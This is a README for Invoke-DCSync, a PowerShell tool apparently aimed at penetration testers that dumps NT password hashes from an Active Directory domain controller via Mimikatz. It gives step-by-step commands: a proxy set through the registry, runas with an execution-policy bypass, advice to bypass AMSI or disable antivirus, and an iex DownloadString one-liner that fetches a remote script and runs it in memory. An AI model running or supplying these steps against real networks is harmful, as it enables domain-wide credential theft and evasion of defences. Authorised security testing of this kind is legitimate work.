# Invoke-DCSync
PowerShell script to DCSync NT-Hashes from an Active Directory Domain Controller (DC) via Mimikatz. 

## General Preparation

1. Connect to the internal AD network via VPN or directly, if on-site.
2. Configure your operating system's proxy to use the client's proxy. Internet is required to download Invoke-Mimikatz and Invoke-DCSync PS scripts. Alternatively, configure a known proxy via PS:

````
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:8080"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
````
3. Open a new PowerShell terminal as another user; use a privileged domain user account with DCSync rights

````
runas.exe /netonly /noprofile /user:mydomain.prod.dom\dcsyncUser "powershell.exe -ep bypass"
````

4. Verify authenticated AD access within your PowerShell terminal window

## DCSync Preparation

It is recommended to bypass AMSI for the current PowerShell session. 

Either use a 0-Day payload or disable AV temporarily during the hash dumping process.

# DCSync Execution

Download ``Invoke-DCSync.ps1`` into memory, which executes the DCSync process. You will be prompted to start the DCSync process and the output directory with all relevant files will be automatically opened by Window's file explorer.

````
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/Invoke-DCSync.ps1')
````
